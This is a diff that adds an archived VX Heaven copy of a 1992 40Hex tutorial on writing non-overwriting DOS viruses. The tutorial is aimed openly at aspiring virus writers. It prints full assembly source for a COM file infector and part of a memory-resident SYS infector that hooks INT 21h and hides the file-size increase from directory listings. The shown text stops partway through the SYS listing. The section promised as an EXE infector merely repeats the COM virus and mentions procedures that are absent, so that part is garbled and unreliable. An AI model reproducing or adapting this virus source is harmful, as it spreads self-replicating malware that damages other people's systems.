@@ -1,0 +1,751 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Dark Angel 'An Introduction to Non-Overwriting Virii' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Dark Angel"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Dark Angel,Introduction to Non-Overwriting Virii, header, push, strategy, routine, file, copy, buffer, field, word, quit, virus, offset, variable, statements, interrupt"/>
+<meta name="Description" content="This article is designed as a simple introduction to all interested to the world of nonoverwriting virii.  All that is assumed is a working knowledge of 80x86 assembly language."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"2ce7c3167567041d2d4953c619bf047f203d0665-1498756609-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vda02.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>An Introduction to Non-Overwriting Virii</h1><p><a href="/lib/?lang=en&amp;author=Dark%20Angel"> Dark Angel</a><br/> <em><a href="/vx.php?fid=18#f18">40hex [7]</a></em><br/> <em>June 1992</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vda02.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vda02">Back to index</a>] [<a href="/lib/vda02.html#disqus_thread">Comments</a>]<br/> 
+<h2>Part I</h2>
+<p>It seems that there are quite a few virus writers out there who just sit at home and churn out hacks of virii. Yay. Anybody with a disassembler and some free time can churn out dozens of undetectable (unscannable) variants of any given virus in an hour. Others have not progressed beyond the overwriting virus, the type of virus with the most limited potential for spreading. Still others have never written a virus before and would like to learn. This article is designed as a simple introduction to all interested to the world of nonoverwriting virii. All that is assumed is a working knowledge of 80x86 assembly language.</p>
+<p>Only the infection of COM files will be treated in this article, since the infection routine is, I think, easier to understand and certainly easier to code than that of EXE files. But do not dispair! EXE infections will be covered in the next issue of 40Hex.</p>
+<p>COM files are described by IBM and Microsoft as "memory image files." Basically, when a COM file is run, the file is loaded as is into memory. No translation or interpretation of any sort takes place. The following steps occur when a COM file is run:</p>
+<ol>
+<li>A PSP is built.</li>
+<li>The file is loaded directly above the PSP.</li>
+<li>The program is run starting from the beginning.</li>
+</ol>
+<p>The PSP is a 256 byte header storing such vital data as the command line parametres used to call the program. The file is located starting at offset 100h of the segment where the program is loaded. Due to the 64K limit on segment length, COM files may only be a maximum of 64K-100h bytes long, or 65280 bytes. If you infect a COM file, make sure the final size is below this amount or the PSP will get corrupted.</p>
+<p>Since the beginning of the file is at offset 100h in the segment (this is the reason for the org 100h at the start of assembly source for com files), the initial IP is set to 100h. The key to understanding nonoverwriting COM virii is to remember that once the program is loaded into memory, it can be changed at will without affecting the actual file on disk.</p>
+<p>The strategy of an overwriting virus is to write the virus to the beginning of the COM file. This, of course, utterly annihilates the original program. This, of course, is lame. The nonoverwriting virus changes only the first few bytes and tacks the virus onto the end of the executable. The new bytes at the beginning of the file cause the program, once loaded, to jump to the virus code. After the virus is done executing, the original first few bytes are rewritten to the area starting at 100h and a jmp instruction is executed to that location (100h). The infected program is none the worse for the wear and will run without error.</p>
+<p>The trick is to find the correct bytes to add to the beginning of the file. The most common method is to use a JMP instruction followed by a two byte displacement. Since these three bytes replace three bytes of the original program, it is important to save these bytes upon infection. The JMP is encoded with a byte of 0e9h and the displacement is simply the old file length minus three.</p>
+<p>To replace the old bytes, simply use code similar to the following:</p>
+<pre class="source">
+	mov di, 100h
+	mov si, offset saved_bytes
+	movsw
+	movsb
+</pre>
+<p>And to return control to the original program, use the following:</p>
+<pre class="source">
+	mov di, 100h
+	jmp di
+</pre>
+<p>or any equivalent statements.</p>
+<p>When writing nonoverwriting virii, it is important to understand that the variables used in the code will not be in their original locations. Since virii are added to the end of the file, you must take the filesize into account when calculating offsets. The standard procedure is to use the short combination of statements:</p>
+<pre class="source"> 
+	call oldtrick
+oldtrick:
+	pop bp				; bp = current IP
+	sub bp, offset oldtrick	; subtract from original offset
+</pre>
+<p>After these statements have been executed, bp will hold the difference in the new offsets of the variables from the original. To account for the difference, make the following substitutions in the viral code:</p>
+<pre class="source">
+	lea dx, [bp+offset variable]
+instead of
+	mov dx, offset variable
+</pre>
+<p>and</p>
+<pre class="source">
+	mov dx, word ptr [bp+offset variable]
+instead of
+	mov dx, word ptr variable
+</pre>
+<p>Alternatively, if you want to save a few bytes and are willing to suffer some headaches, leave out the sub bp, offset oldtrick and calculate all offsets as per the procedure above EXCEPT you must now also subtract offset oldtrick from each of the offsets.</p>
+<p>The following is a short nonoverwriting virus which will hopefully help in your understanding of the techniques explained above. It's sort of cheesy, since I designed it to be small and easily understandable. In addition to being inefficient (in terms of size), it fails to preserve file date/time and will not infect read-only files. However, it serves its purpose well as a teaching aid.</p>
+<pre class="source">
+  --------Tear line----------------------------------------------------------
+
+  DumbVirus segment
+  Assume    CS:DumbVirus
+  Org 100h                 ; account for PSP
+
+  ; Dumb Virus - 40Hex demo virus
+  ; Assemble with TASM /m2
+
+  Start:  db      0e9h     ; jmp duh
+          dw      0
+
+  ; This is where the virus starts
+  duh:    call    next
+  next:   pop     bp                   ; bp holds current location
+          sub     bp, offset next      ; calculate net change
+
+  ; Restore the original first three bytes
+          lea     si, [bp+offset stuff]
+          mov     di, 100h
+  ; Put 100h on the stack for the retn later
+  ; This will allow for the return to the beginning of the file
+          push    di
+          movsw
+          movsb
+
+  ; Change DTA from default (otherwise Findfirst/next will destroy
+  ; commandline parametres
+          lea     dx, [bp+offset dta]
+          call    set_dta
+
+          mov     ah, 4eh           ; Find first
+          lea     dx, [bp+masker]   ; search for '*.COM',0
+          xor     cx, cx            ; attribute mask - this is unnecessary
+  tryanother:
+          int     21h
+          jc      quit              ; Quit on error
+
+  ; Open file for read/write
+  ; Note: This fails on read-only files
+          mov     ax, 3D02h
+          lea     dx, [bp+offset dta+30] ; File name is located in DTA
+          int     21h
+          xchg    ax, bx
+
+  ; Read in the first three bytes
+          mov     ah, 3fh
+          lea     dx, [bp+stuff]
+          mov     cx, 3
+          int     21h
+
+  ; Check for previous infection
+          mov     ax, word ptr [bp+dta+26]       ; ax = filesize
+          mov     cx, word ptr [bp+stuff+1]      ; jmp location
+          add     cx, eov - duh + 3              ; convert to filesize
+          cmp     ax, cx                         ; if same, already infected
+          jz      close                          ; so quit out of here
+
+  ; Calculate the offset of the jmp
+          sub     ax, 3                          ; ax = filesize - 3
+          mov     word ptr [bp+writebuffer], ax
+
+  ; Go to the beginning of the file
+          xor     al, al
+          call    f_ptr
+
+  ; Write the three bytes
+          mov     ah, 40h
+          mov     cx, 3
+          lea     dx, [bp+e9]
+          int     21h
+
+  ; Go to the end of the file
+          mov     al, 2
+          call    f_ptr
+
+  ; And write the rest of the virus
+          mov     ah, 40h
+          mov     cx, eov - duh
+          lea     dx, [bp+duh]
+          int     21h
+
+  close:
+          mov     ah, 3eh
+          int     21h
+
+  ; Try infecting another file
+          mov     ah, 4fh                        ; Find next
+          jmp     short tryanother
+
+  ; Restore the DTA and return control to the original program
+  quit:   mov     dx, 80h                        ; Restore current DTA to
+                                                 ; the default @ PSP:80h
+  set_dta:
+          mov     ah, 1ah                        ; Set disk transfer address
+          int     21h
+          retn
+  f_ptr:  mov     ah, 42h
+          xor     cx, cx
+          cwd                                    ; equivalent to: xor dx, dx
+          int     21h
+          retn
+
+  masker  db      '*.com',0
+  ; Original three bytes of the infected file
+  ; Currently holds a INT 20h instruction and a null byte
+  stuff   db      0cdh, 20h, 0
+  e9      db      0e9h
+  eov equ $                                      ; End of the virus
+  ; The following variables are stored in the heap space (the area between
+  ; the stack and the code) and are not part of the virus that is written
+  ; to files.
+  writebuffer dw  ?                              ; Scratch area holding the
+                                                 ; JMP offset
+  dta         db 42 dup (?)
+  DumbVirus    ENDS
+               END     Start
+
+  ---------------------------------------------------------------------------
+</pre>
+<p>Do not worry if not everything makes sense to you just yet. I tried to keep the example virus as simple as possible, although, admittedly, the explanations were a bit cryptic. It should all come to you in time.</p>
+<p>For a more complete discussion of nonoverwriting virii, pick up a copy of each of the first three parts of my virus writing guide (the phunky, the chunky, and the crunchy), where you may find a thorough tutorial on nonresident virii suitable for any beginning virus programmer.</p>
+<h2>Part II</h2>
+<p>In the last issue of 40Hex, I presented theory and code for the nonoverwriting COM infector, the simplest of all parasitic virii. Hopefully, having learned COM infections cold, you are now ready for EXE infections. There is a grey veil covering the technique of EXE infections, as the majority of virii are COM-only.</p>
+<p>EXE infections are, in some respects, simpler than COM viruses. However, to understand the infection, you must understand the structure of EXE files (naturally). EXE files are structured into segments which are loaded consecutively atop one another. Thus, all an EXE infector must do is create its own segment in the EXE file and alter the entry point appropriately. Therefore, EXE infections do not require restoration of bytes of code, but rather involve the manipulation of the header which appears in the beginning every EXE file and the appending of viral code to the infected file. The format of the header follows:</p>
+<table border="1" cellspacing="0" cellpadding="1" summary="EXE header format">
+<tr><th>Offset</th><th>Description</th></tr>
+<tr><td>00</td><td>ID word, either 'MZ' or 'ZM'</td></tr>
+<tr><td>02</td><td>Number of bytes in the last (512 byte) page in the image</td></tr>
+<tr><td>04</td><td>Total number of 512 byte pages in the file</td></tr>
+<tr><td>06</td><td>Number of entries in the segment table</td></tr>
+<tr><td>08</td><td>Size of the header in (16 byte) paragraphs</td></tr>
+<tr><td>0A</td><td>Minimum memory required in paragraphs</td></tr>
+<tr><td>0C</td><td>Maximum memory requested in paragraphs</td></tr>
+<tr><td>0E</td><td>Initial offset in paragraphs to stack segment from header</td></tr>
+<tr><td>10</td><td>Initial offset in bytes of stack pointer from stack segment</td></tr>
+<tr><td>12</td><td>Negative checksum (ignored)</td></tr>
+<tr><td>14</td><td>Initial offset in bytes of instruction pointer from code segment</td></tr>
+<tr><td>16</td><td>Initial offset in paragraphs of code segment from header</td></tr>
+<tr><td>18</td><td>Offset of relocation table from start of file</td></tr>
+<tr><td>1A</td><td>Overlay number (ignored)</td></tr>
+</table>
+<p>The ID word is generally 'ZM' (in the Intel little-endian format). Few files start with the alternate form, 'MZ' (once again in Intel little-endian format). To save space, a check for the alternate form of the EXE ID in the virus may be omitted, although a few files may be corrupted due to this omission.</p>
+<p>The words at offsets 2 and 4 are related. The word at offset 4 contains the filesize in pages. A page is a 512 byte chunk of memory, just as a word is a two byte chunk of memory. This number is rounded up, so a file of length 514 bytes would contain a 2 at offset 4 in the EXE header. The word at offset 2 is the image length modulo 512. The image length does not include the header length. This is one of the bizarre quirks of the EXE header. Since the header length is usually a multiple of 512 anyway, this quirk usually does not matter. If the word at offset 2 is equal to four, then it is generally ignored (heck, it's never really used anyway) since pre-1.10 versions of the Microsoft linker had a bug which caused the word to always be equal to four. If you are bold, the virus can set this word to 4. However, keep in mind that this was a bug of the linker and not all command interpreters may recognise this quirk.</p>
+<p>The minimum memory required by the program (offset A) can be ignored by the virus, as the maximum memory is generally allocated to the program by the operating system. However, once again, ignoring this area of the header MAY cause an unsucessful infection. Simply adding the virus size in paragraphs to this value can nullify the problem.</p>
+<p>The words representing the initial stack segment and pointer are reversed (not in little-endian format). In other words, an LES to this location will yield the stack pointer in ES and the stack segment in another register. The initial SS:SP is calculated with the base address of 0000:0000 being at the end of the header.</p>
+<p>Similarly, the initial CS:IP (in little-endian format) is calculated with the base address of 0000:0000 at the end of the header. For example, if the program entry point appears directly after the header, then the CS:IP would be 0000:0000. When the program is loaded, the PSP+10 is added to the segment value (the extra 10 accounts for the 100h bytes of the PSP).</p>
+<p>All the relevant portions of the EXE header have been covered. So what should be done to write a nonoverwriting EXE infector? First, the virus must be appended to the end of the file. Second, the initial CS:IP must be saved and subsequently changed in the header. Third, the initial SS:SP should also be saved and changed. This is to avoid any possible memory conflicts from the stack overwriting viral code. Fourth, the file size area of the header should be modified to correctly reflect the new size of the file. Fifth, any additional safety modifications such as increasing the minimum memory allocation should be made. Last, the header should be written to the infected file.</p>
+<p>There are several good areas for ID bytes in the EXE header. The first is in the stack pointer field. Since it should be changed anyway, changing it to a predictable number would add nothing to the code length. Make sure, however, to make the stack pointer high enough to prevent code overwrites. Another common area for ID bytes is in the negative checksum field. Since it is an unused field, altering it won't affect the execution of any programs.</p>
+<p>One further item should be mentioned before the code for the EXE infector. It is important to remember that EXE files are loaded differently than COM files. Although a PSP is still built, the initial CS does NOT point to it. Instead, it points to wherever the entry point happens to be. DS and ES point to the PSP, and therefore do NOT point to the entry point (your virus code). It is important to restore DS and ES to their proper values before returning control to the EXE.</p>
+<pre class="source">
+  --------Tear line----------------------------------------------------------
+
+  DumbVirus segment
+  Assume    CS:DumbVirus
+  Org 100h                 ; account for PSP
+
+  ; Dumb Virus - 40Hex demo virus
+  ; Assemble with TASM /m2
+
+  Start:  db      0e9h     ; jmp duh
+          dw      0
+
+  ; This is where the virus starts
+  duh:    call    next
+  next:   pop     bp                   ; bp holds current location
+          sub     bp, offset next      ; calculate net change
+
+  ; Restore the original first three bytes
+          lea     si, [bp+offset stuff]
+          mov     di, 100h
+  ; Put 100h on the stack for the retn later
+  ; This will allow for the return to the beginning of the file
+          push    di
+          movsw
+          movsb
+
+  ; Change DTA from default (otherwise Findfirst/next will destroy
+  ; commandline parametres
+          lea     dx, [bp+offset dta]
+          call    set_dta
+
+          mov     ah, 4eh           ; Find first
+          lea     dx, [bp+masker]   ; search for '*.COM',0
+          xor     cx, cx            ; attribute mask - this is unnecessary
+  tryanother:
+          int     21h
+          jc      quit              ; Quit on error
+
+  ; Open file for read/write
+  ; Note: This fails on read-only files
+          mov     ax, 3D02h
+          lea     dx, [bp+offset dta+30] ; File name is located in DTA
+          int     21h
+          xchg    ax, bx
+
+  ; Read in the first three bytes
+          mov     ah, 3fh
+          lea     dx, [bp+stuff]
+          mov     cx, 3
+          int     21h
+
+  ; Check for previous infection
+          mov     ax, word ptr [bp+dta+26]       ; ax = filesize
+          mov     cx, word ptr [bp+stuff+1]      ; jmp location
+          add     cx, eov - duh + 3              ; convert to filesize
+          cmp     ax, cx                         ; if same, already infected
+          jz      close                          ; so quit out of here
+
+  ; Calculate the offset of the jmp
+          sub     ax, 3                          ; ax = filesize - 3
+          mov     word ptr [bp+writebuffer], ax
+
+  ; Go to the beginning of the file
+          xor     al, al
+          call    f_ptr
+
+  ; Write the three bytes
+          mov     ah, 40h
+          mov     cx, 3
+          lea     dx, [bp+e9]
+          int     21h
+
+  ; Go to the end of the file
+          mov     al, 2
+          call    f_ptr
+
+  ; And write the rest of the virus
+          mov     ah, 40h
+          mov     cx, eov - duh
+          lea     dx, [bp+duh]
+          int     21h
+
+  close:
+          mov     ah, 3eh
+          int     21h
+
+  ; Try infecting another file
+          mov     ah, 4fh                        ; Find next
+          jmp     short tryanother
+
+  ; Restore the DTA and return control to the original program
+  quit:   mov     dx, 80h                        ; Restore current DTA to
+                                                 ; the default @ PSP:80h
+  set_dta:
+          mov     ah, 1ah                        ; Set disk transfer address
+          int     21h
+          retn
+  f_ptr:  mov     ah, 42h
+          xor     cx, cx
+          cwd                                    ; equivalent to: xor dx, dx
+          int     21h
+          retn
+
+  masker  db      '*.com',0
+  ; Original three bytes of the infected file
+  ; Currently holds a INT 20h instruction and a null byte
+  stuff   db      0cdh, 20h, 0
+  e9      db      0e9h
+  eov equ $                                      ; End of the virus
+  ; The following variables are stored in the heap space (the area between
+  ; the stack and the code) and are not part of the virus that is written
+  ; to files.
+  writebuffer dw  ?                              ; Scratch area holding the
+                                                 ; JMP offset
+  dta         db 42 dup (?)
+  DumbVirus    ENDS
+               END     Start
+
+  ---------------------------------------------------------------------------
+</pre>
+<p>This is a simple EXE infector. It has limitations; for example, it does not handle misnamed COM files. This can be remedied by a simple check:</p>
+<pre class="source">
+	cmp [bp+buffer],'ZM'
+	jnz misnamed_COM
+continueEXE:
+</pre>
+<p>Take special notice of the done_infections and infect_exe procedures. They handle all the relevant portions of the EXE infection. The restoration of the EXE file simply consists of resetting the stack and a far jmp to the original entry point.</p>
+<p>A final note on EXE infections: it is often helpful to "pad" EXE files to the nearest segment. This accomplishes two things. First, the initial IP is always 0, a fact which can be used to eliminate delta offset calculations. Code space can be saved by replacing all those annoying relative memory addressing statements ([bp+offset blip]) statements with their absolute counterparts (blip). Second, recalculation of header info can be handled in paragraphs, simplifying it tremendously. The code for this is left as an exercise for the reader.</p>
+<p>This file is dedicated to the [XxXX] (Censored. -Ed.) programmers (who have yet to figure out how to write EXE infectors). Hopefully, this text can teach them (and everyone else) how to progress beyond simple COM and spawning EXE infectors. In the next issue of 40Hex, I will present the theory and code for the next step of file infector - the coveted SYS file.</p>
+<h2>Part III</h2>
+<p>The SYS file is the most overlooked executable file structure in DOS. Viruses are quite capable of infecting SYS files, as DOS kindly allows for such extensions to this file format.</p>
+<p>The SYS file is loaded beginning at offset 0 of a particular segment. It consists of a header followed by code. SYS files may be chained together after a simple modification in the header. This is the key to infecting SYS files.</p>
+<p>There are two types of device drivers; block and character. Block devices include floppy, hard, and virtual disks, i.e. any media which can store data. Character devices include printers, modems, keyboard, and the screen. The virus will generally be a character device, as it reduces complexity.</p>
+<p>The header structure is straightforward:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="The header structure">
+<tr><th>Offset</th><th>Size</th><th>Description</th></tr>
+<tr><td>0h</td><td>DWORD</td><td>Pointer to next header</td></tr>
+<tr><td>4h</td><td>WORD</td><td>Attribute</td></tr>
+<tr><td>6h</td><td>WORD</td><td>Pointer to strategy routine</td></tr>
+<tr><td>8h</td><td>WORD</td><td>Pointer to interrupt routine</td></tr>
+<tr><td>0Ah</td><td>QWORD</td><td>Name of the device driver</td></tr>
+</table>
+<p>The pointer to the next device driver header appears at offset zero in the header. This is a far pointer consisting of a segment:offset pair. If the current device is the only device appearing in the SYS file, then this pointer should be set to FFFF:FFFF. However, if there are two or more device drivers contained in the file, then the offset field should be equal to the absolute location of the next device in the file. The segment field should remain FFFF. For example, if a second device driver occurs at offset 300h of the file, then the DWORD at offset 0 would be FFFF:0300 The second (and all other) device driver must contain a new header as well.</p>
+<p>The next field contains the attribute of the device driver. Bit 15 determines the nature of the device driver. If bit 15 is set, then thedevice driver header corresponds to a character device; otherwise, the device is a block device. You need not concern yourself with any of the other bits; they may remain cleared.</p>
+<p>Before the next two fields may be understood, it is necessary to introduce the concept of the request header. The request header contains DOS's requests of the device driver. For example, DOS may ask for initialisation or a read or even a status check. The information needed by the device driver to interpret the request is all contained in the request header. Itis passed to the strategy routine by DOS as a far pointer in ES:BX. The job of the strategy routine is to save the pointer for use by the interruptroutine. The interrupt routine is called by DOS immediately after the strategy routine. This routine processes the request in the header and performs the appropriate actions.</p>
+<p>The word-length pointers in the SYS header to the strategy and interrupt routines are relative to the start of the SYS file. So, if the strategy routine resides in absolute offset 32h in the file, then the field containing the location of the strategy routine would hold the number 32h.</p>
+<p>The name field in the SYS header simply holds an 8 byte device name. For example, 'NUL ' and 'CLOCK$ ' are two common DOS devices. The name should be justified with space characters (0x20).</p>
+<p>By using DOS's feature of chaining SYS files, we may easily infect this type of file. No bytes need to be saved. There are but two steps. The first is to concatenate the virus to the target file. The second is to alter the first word of the SYS file to point to the virus header. The only trick involved is writing the SYS interrupt routine. The format of the request header is:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="format of the request header">
+<tr><th>Offset</th><th>Size</th><th>Description</th></tr>
+<tr><td>0h</td><td>BYTE</td><td>Length of request header (in bytes)</td></tr>
+<tr><td>1h</td><td>BYTE</td><td>Unit code (for block devices)</td></tr>
+<tr><td>2h</td><td>BYTE</td><td>Command code</td></tr>
+<tr><td>3h</td><td>WORD</td><td>Status</td></tr>
+<tr><td>5h</td><td>QWORD</td><td>Reserved by DOS</td></tr>
+<tr><td>0Dh</td><td>Var.</td><td>Data for the operation</td></tr>
+</table>
+<p>Only one command code is relevant for use in the virus. Upon initialisation of the device driver, DOS will send a request header with 0 in the command code field. This is the initialisation check. The format of the variable sized field in the request header in this case is:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="variable sized field in the request header">
+<tr><th>Offset</th><th>Size</th><th>Description</th></tr>
+<tr><td>0Dh</td><td>BYTE</td><td>Number of units (ignored by character devices)</td></tr>
+<tr><td>0Eh</td><td>DWORD</td><td>Ending address of resident program code</td></tr>
+<tr><td>12h</td><td>DWORD</td><td>Pointer to BPB aray (ignored by character devices)</td></tr>
+<tr><td>16h</td><td>BYTE</td><td>Drive number (irrelevant in character devices)</td></tr>
+</table>
+<p>The only relevant fields are at offset 3 and 0Eh. Offset 3 holds the status word of the operation. The virus fills this in with the appropriate value. Generally, the virus should put a value of 100h in the status word in the event of a successful request and a 8103h in the status word in the event of a failure. The 8103h causes DOS to think that the device driver does not understand the request. A value of 8102h should be returned in the event of a failed installation. Offset 0Eh will hold the address of the end of the virus (include the heap!) in the event of a successful installation and CS:0 in the event of a failure.</p>
+<p>Basically, the strategy routine of the virus should contain a simple stub to save the es:bx pointer. The interrupt routine should fail all requests other than initialisation. It should perform an installation if the virus is not yet installed and fail if it is already in memory (remember to set offset 0eh to cs:0).</p>
+<p>A sample infector with very limited stealth features follows. While it is somewhat large, it may be easily coupled with a simple COM/EXE infection routine to create a powerful virus. It is a SYS-only, memory resident infector.</p>
+<pre class="source">
+  ---------------------------------------------------------------------------
+  .model tiny
+  .code
+  org 0                           ; SYS files originate at zero
+  ; SYS infector
+  ; Written by Dark Angel of Phalcon/Skism
+  ; for 40Hex
+  header:
+
+  next_header dd -1               ; FFFF:FFFF
+  attribute   dw  8000h           ; character device
+  strategy    dw  offset _strategy
+  interrupt   dw  offset _interrupt
+  namevirus   db  'SYS INF '      ; simple SYS infector
+
+  endheader:
+
+  author      db  0,'Simple SYS infector',0Dh,0Ah
+              db    'Written by Dark Angel of Phalcon/Skism',0
+
+  _strategy:  ; save es:bx pointer
+          push    si
+          call    next_strategy
+  next_strategy:
+          pop     si
+          mov     cs:[si+offset savebx-offset next_strategy],bx
+          mov     cs:[si+offset savees-offset next_strategy],es
+          pop     si
+          retf
+
+  _interrupt:  ; install virus in memory
+          push    ds                      ; generally, only the segment
+          push    es                      ; registers need to be preserved
+
+          push    cs
+          pop     ds
+
+          call    next_interrupt
+  next_interrupt:
+          pop     bp
+          les     bx,cs:[bp+savebx-next_interrupt] ; get request header
+  pointer
+
+          mov     es:[bx+3],8103h         ; default to fail request
+          cmp     byte ptr es:[bx+2], 0   ; check if it is installation
+  request
+          jnz     exit_interrupt          ; exit if it is not
+
+          mov     es:[bx+10h],cs          ; fill in ending address value
+          lea     si,[bp+header-next_interrupt]
+          mov     es:[bx+0eh],si
+          dec     byte ptr es:[bx+3]      ; and assume installation failure
+
+          mov     ax, 0b0fh               ; installation check
+          int     21h
+          cmp     cx, 0b0fh
+          jz      exit_interrupt          ; exit if already installed
+
+          add     es:[bx+0eh],offset endheap ; fixup ending address
+          mov     es:[bx+3],100h          ; and status word
+
+          xor     ax,ax
+          mov     ds,ax                   ; ds->interrupt table
+          les     bx,ds:[21h*4]           ; get old interrupt handler
+          mov     word ptr cs:[bp+oldint21-next_interrupt],bx
+          mov     word ptr cs:[bp+oldint21+2-next_interrupt],es
+
+          lea     si,[bp+int21-next_interrupt]
+          cli
+          mov     ds:[21h*4],si           ; replace int 21h handler
+          mov     ds:[21h*4+2],cs
+          sti
+  exit_interrupt:
+          pop     es
+          pop     ds
+          retf
+
+  int21:
+          cmp     ax,0b0fh                ; installation check?
+          jnz     notinstall
+          xchg    cx,ax                   ; mark already installed
+  exitint21:
+          iret
+  notinstall:
+          pushf
+          db      9ah                     ; call far ptr  This combined with
+  the
+  oldint21 dd     ?                       ; pushf simulates an int 21h call
+
+          pushf
+
+          push    bp
+          push    ax
+
+          mov     bp, sp                  ; set up new stack frame
+                                          ; flags         [bp+10]
+                                          ; CS:IP         [bp+6]
+                                          ; flags new     [bp+4]
+                                          ; bp            [bp+2]
+                                          ; ax            [bp]
+          mov     ax, [bp+4]              ; get flags
+          mov     [bp+10], ax             ; replace old flags with new
+
+          pop     ax                      ; restore the stack
+          pop     bp
+          popf
+
+          cmp     ah, 11h                 ; trap FCB find first and
+          jz      findfirstnext
+          cmp     ah, 12h                 ; FCB find next calls only
+          jnz     exitint21
+  findfirstnext:
+          cmp     al,0ffh                 ; successful findfirst/next?
+          jz      exitint21               ; exit if not
+
+          push    bp
+          call    next_int21
+  next_int21:
+          pop     bp
+          sub     bp, offset next_int21
+
+          push    ax                      ; save all registers
+          push    bx
+          push    cx
+          push    dx
+          push    ds
+          push    es
+          push    si
+          push    di
+
+          mov     ah, 2fh                 ; ES:BX &lt;- DTA
+          int     21h
+
+          push    es                      ; DS:BX->DTA
+          pop     ds
+
+          cmp     byte ptr [bx], 0FFh     ; extended FCB?
+          jnz     regularFCB              ; continue if not
+          add     bx, 7                   ; otherwise, convert to regular FCB
+  regularFCB:
+          mov     cx, [bx+29]             ; get file size
+          mov     word ptr cs:[bp+filesize], cx
+
+          push    cs                      ; ES = CS
+          pop     es
+
+          cld
+
+          ; The following code converts the FCB to an ASCIIZ string
+          lea     di, [bp+filename]       ; destination buffer
+          lea     si, [bx+1]              ; source buffer - filename
+
+          cmp     word ptr [si],'OC'      ; do not infect CONFIG.SYS
+          jz      bombout
+
+          mov     cx, 8                   ; copy up to 8 bytes
+  back:   cmp     byte ptr ds:[si], ' '   ; is it a space?
+          jz      copy_done               ; if so, done copying
+          movsb                           ; otherwise, move character to
+  buffer
+          loop    back
+
+  copy_done:
+          mov     al, '.'                 ; copy period
+          stosb
+
+          mov     ax, 'YS'
+          lea     si, [bx+9]              ; source buffer - extension
+          cmp     word ptr [si], ax       ; check if it has the SYS
+          jnz     bombout                 ; extension and exit if it
+          cmp     byte ptr [si+2], al     ; does not
+          jnz     bombout
+          stosw                           ; copy 'SYS' to the buffer
+          stosb
+
+          mov     al, 0                  ; copy null byte
+          stosb
+
+          push    ds
+          pop     es                      ; es:bx -> DTA
+
+          push    cs
+          pop     ds
+
+          xchg    di,bx                   ; es:di -> DTA
+                                          ; open file, read/only
+          call    open                    ; al already 0
+          jc      bombout                 ; exit on error
+
+          mov     ah, 3fh                 ; read first
+          mov     cx, 2                   ; two bytes of
+          lea     dx, [bp+buffer]         ; the header
+          int     21h
+
+          mov     ah, 3eh                 ; close file
+          int     21h
+
+  InfectSYS:
+          inc     word ptr cs:[bp+buffer] ; if first word not FFFF
+          jz      continueSYS             ; assume already infected
+                                          ; this is a safe bet since
+                                          ; most SYS files do not have
+                                          ; another SYS file chained on
+
+  alreadyinfected:
+          sub     es:[di+29], heap - header ; hide file size increase
+                                          ; during a DIR command
+                                          ; This causes CHKDSK errors
+         ;sbb     word ptr es:[di+31], 0  ; not needed because SYS files
+                                          ; are limited to 64K maximum
+
+  bombout:
+          pop     di
+          pop     si
+          pop     es
+          pop     ds
+          pop     dx
+          pop     cx
